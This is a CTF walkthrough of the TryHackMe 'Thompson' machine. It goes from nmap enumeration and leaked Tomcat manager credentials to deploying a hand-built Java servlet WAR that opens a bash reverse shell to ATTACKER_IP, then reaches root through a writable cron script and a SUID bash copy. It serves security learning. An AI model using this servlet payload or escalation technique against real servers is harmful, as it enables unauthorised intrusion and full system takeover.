
# TryHackMe | Thompson


![Thompson Image](thm-thompson.png)

☍ Room Link - "https://tryhackme.com/room/bsidesgtthompson"

> Hello fellow hackers, learners, and security enthusiasts! 💻
> 
> Welcome to my corner of the internet where I document my path through the exciting world of penetration testing and cybersecurity. Whether you're here to follow along, learn together, or just curious about ethical hacking - I'm glad you stopped by!

## Introduction

This writeup walks through the "Thompson" challenge from TryHackMe. You'll follow a step-by-step journey from initial reconnaissance to full system compromise, including the real-world trial and errors encountered along the way.

In this guide, you'll learn:
- Basic enumeration techniques using **nmap**
- 

Grab a coffee and let's get started! ☕

**📋 Machine Tasks -** 
- boot2root machine for FIT and bsides guatemala CTF

## Enumeration

**Nmap Scan Results : -** 

First, I started with a basic **nmap** scan as usual - 

```shell

 ➥ $ nmap -sCV -p- 10.10.159.83

Nmap scan report for 10.10.159.83
Host is up (0.012s latency).
Not shown: 65532 closed tcp ports (conn-refused)

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)
|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)
|_  256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http    Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/8.5.5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.81 seconds

```


**Command Explanation -** 
- **nmap** , network exploration tool and security / port scanner.
- **-sC** , for default script.
- **-sV** , for service/version info.
- **-p-** , to scan ports from 1 through 65535.
- read more "https://manpages.ubuntu.com/manpages/trusty/en/man1/nmap.1.html"

From the above scan results - 
- **Port 8080** : 'Apache Tomcat' web server (**Java web application server**).
- **Port 8009** : 'Apache JServ Protocol (AJP)' service is running. It's a **binary protocol** for communication between Apache HTTPD web server (Front-end) and Java servlet container (Back-end). I did a bit google search on this.
- **Port 22** : 'OpenSSH' server and The service is running and accessible on port 22.

**Note :** 
	This machine is running an outdated and vulnerable version of Apache Tomcat 8, for which there are multiple public exploits. While easy methods like using a Metasploit module or a known CVE exist, this write-up will focus on a manual exploitation process.

For reference, please see the links below :
- https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/tomcat/index.html
- https://medium.com/@mingihongkim/exploiting-java-portlets-with-a-malicious-war-file-to-gain-a-reverse-shell-2504909f71c1
- https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#java

## Exploitation

Let's visit the web page at "http://10.10.159.83:8080/" - 

![Apache Tomcat](thm-thompson-pic1.png)

I tried to check the **server status** option and I got an pop up to enter the username and password. I tried with some basic combinations but no success there.

![Apache Tomcat Login](thm-thompson-pic2.png)

Interestingly, upon clicking the cancel button the server displays a message. Which reveals the username and password. Check the below image - 

![Tomcat Credentials](thm-thompson-pic3.png)

Let's try to login with the given credentials from the above step and you will find the below page - 

![Server Status](thm-thompson-pic5.png)

Note : Find the java version from the above image. We have to consider it when crafting our payload.

Now, if we select **List Applications** option we can see a page of running applications and also we have an option to deploy our custom applications (WAR File - Web Application Archive File).

![Deploy War File](thm-thompson-pic6.png)

## Crafting A Payload

A WAR file is essentially a ZIP file with a specific folder structure that Java application servers expect. For our servlet to work, we must create this structure manually.

Here is the required structure for our project, named `ReverseShell`:

```
ReverseShell/
├── WEB-INF/
│   ├── web.xml
│   └── classes/
└── ShellServlet.java (source file, not included in the WAR)
```

**What I Did:**

1. I created the main project folder: `ReverseShell`.
2. Inside it, I created the `WEB-INF` folder.
3. Inside `WEB-INF`, I created the `classes` folder.
4. I placed the `ShellServlet.java` source file in the main `ReverseShell` folder.
5. I created and configured the `web.xml` deployment descriptor inside the `WEB-INF` folder.

> **Note for Beginners:** The `WEB-INF/classes` directory is where the compiled Java classes (`.class` files) must live. The server automatically looks for them here.


ShellServlet.java
```java
import java.io.*;
import javax.servlet.*;
import javax.servlet.http.*;

public class ShellServlet extends HttpServlet {
    public void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        String host = "ATTACKER_IP";
        int port = 4444;
        String[] cmd = {"/bin/bash", "-c", "/bin/bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1"};
        Runtime.getRuntime().exec(cmd);
    }
}
```

web.xml
```xml
<web-app>
  <servlet>
    <servlet-name>ShellServlet</servlet-name>
    <servlet-class>ShellServlet</servlet-class>
  </servlet>
  <servlet-mapping>
    <servlet-name>ShellServlet</servlet-name>
    <url-pattern>/shell</url-pattern>
  </servlet-mapping>
</web-app>
```

Check the above mentioned reference links for detailed explanations.

A servlet depends on classes from the `servlet-api.jar` library, which is not part of the standard Java SE. I had to provide this library during compilation.

```shell
$ /usr/lib/jvm/java-8-openjdk/bin/javac -cp "/usr/share/java/tomcat8/servlet-api.jar" -d ReverseShell/WEB-INF/classes/ ReverseShell/ShellServlet.java
```

**Explanation of the Command:**

- `javac`: The Java compiler.
- `-cp "/usr/share/java/tomcat8/servlet-api.jar"`: The `-cp` flag sets the **Classpath**. This tells the compiler where to find the necessary `servlet-api.jar` library.
- `-d ReverseShell/WEB-INF/classes/`: The `-d` flag specifies the **output directory**. This is the most important part! It tells `javac` to put the generated `ShellServlet.class` file directly into the correct `WEB-INF/classes` folder.
- `ReverseShell/ShellServlet.java`: This is the path to our source file.


**Why the specific paths?**

- I used the full path to `javac` (`/usr/lib/jvm/.../javac`) because I have multiple Java versions installed, and I needed to ensure I used Java 8.
- I specified the path to `servlet-api.jar` because it's part of Tomcat, not the standard Java installation.

Once the `.class` file is in `WEB-INF/classes` and the `web.xml` is in `WEB-INF`, we can create the WAR file. (You should remove the Java source file from the folder before creating the WAR file, as leaving source code in deployment packages is not a good idea.)

Finally, we can create our war file - 

![Creating War File](thm-thompson-pic7.png)

**Explanation of the Command:**

- `jar`: The utility for creating Java archive files (JAR, WAR).
- `-cvf`: These are options.
    - `c` - **C**reate a new archive.
    - `v` - Produce **v**erbose output (shows the files being added).
    - `f` - Specify the **f**ilename of the archive.
- `reverse.war`: The name of the WAR file we are creating.
- `-C ReverseShell/ .`: This is a crucial part.
    - The `-C` flag means "**C**hange to this directory."
    - `ReverseShell/` is the directory we change to.
    - The `.` means "add all files and folders from here."
    - So, this command adds the _contents_ of the `ReverseShell` folder (which are `WEB-INF/` and our other files) directly into the root of the `reverse.war` file, preserving the correct structure.

The final `reverse.war` file will be created in your current working directory and is ready to be deployed to a server like Tomcat.

Well, we have also started our listener now let's upload the file.

![Uploaded The War File](thm-thompson-pic8.png)

## Initial Access


We have to visit "http://10.10.159.83:8080/reverse/shell" to trigger our reverse shell. And, we got a reverse shell - 

![User Flag](thm-thompson-pic9.png)

After gaining the shell - 
- Upgraded a shell using Python 3 - **python3 -c 'import pty; pty.spawn("/bin/bash")'**. This will create a more interactive shell environment.
- **whoami** - to check the current user.
- **cd /home/jack** - to change our working directory
- **user.txt** file contains our **user flag**.

## Privilege Escalation

Let's analyse the other files inside **/home/jack** directory - 

![Analysing The Files](thm-thompson-pic10.png)

Explanation - 

1. **id.sh** - This is a simple bash script which executes the **id** command and saves the output in **test.txt** file. The user **tomcat** (currently logged in user) has all the permissions i.e. (read, write, and execute).
2. **test.txt** - The user **tomcat** (currently logged in user) has only read permission.

Although we can edit and execute the **id.sh** file, If we try to run this file we will face an error as we do not have write permission to the **test.txt** file.

If you check the content inside the **test.txt** file, we will find that those are actually coming from root user. So, the file (id.sh) is somehow executing from root user account.

Check the ids - 
![User IDs](thm-thompson-pic11.png)

### System-wide cron jobs

![Cron Jobs](thm-thompson-pic12.png)

**What it means:**

- * * * * * - Runs **every minute of every hour, every day, every month**
- **root** - Executes as the **root user**
- **cd /home/jack && bash id.sh** - The command that runs

Well, we have permission to edit the **id.sh** file. Let's modify it so our command executes with root privileges.

**1. The Easy Path -** 

![Priv Esca 1](thm-thompson-pic13.png)

Explanation - 
- Here, I assumed that the root flag is stored in `/root/root.txt`.
- **echo 'cat /root/root.txt >> /home/jack/test.txt'** - Creates the command string that reads **/root/root.txt** (root's flag file) and appends the output to **/home/jack/test.txt**.
- **>> id.sh** - Appends this command to the **id.sh** script.
- After a few second we can get the updated content from **test.txt** file with the **root flag**.

**2. The Learning Path**

![Priv Esc 2](thm-thompson-pic14.png)

Explanation - 
- Here, I have created a SUID binary to gain root shell access.
- **cp /bin/bash /tmp/bash** - Copies the bash binary to **/tmp/bash**.
- **chmod u+s /tmp/bash** - Sets the **SUID (Set User ID) bit** on the copied bash binary, making it run with the file owner's privileges (root).
- **>> id.sh** - Appends this command to the **id.sh** script.
- **/tmp/bash -p** - Executes our SUID bash binary with the **-p** flag.
- The **-p flag is crucial** as it prevents bash from dropping privileged permissions, allowing us to maintain root privileges.


💻 Happy Hacking 💻
